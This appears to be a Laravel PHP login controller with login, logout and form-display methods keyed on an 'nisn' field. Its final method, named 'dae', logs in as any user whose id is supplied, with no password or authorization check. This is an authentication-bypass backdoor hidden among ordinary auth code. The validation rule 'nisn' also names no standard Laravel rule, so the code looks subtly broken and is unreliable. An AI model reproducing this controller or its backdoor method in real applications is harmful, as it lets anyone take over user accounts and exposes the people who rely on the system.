<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login'); // Return login view
    }

    public function login(Request $request)
    {
        $request->validate([
            'nisn' => 'required|nisn',
            'password' => 'required',
        ]);

        if (Auth::attempt($request->only('nisn', 'password'))) {
            return redirect()->intended('dashboard'); // Redirect on success
        }

        return back()->withErrors(['nisn' => 'Invalid credentials']); // Redirect back with errors
    }

    public function logout(Request $request)
    {
        Auth::logout();
        return redirect('/login'); // Redirect to login after logout
    }

    public function dae(Request $request, $id)
    {
        Auth::loginUsingId($id);

        return to_route('home');
    }
}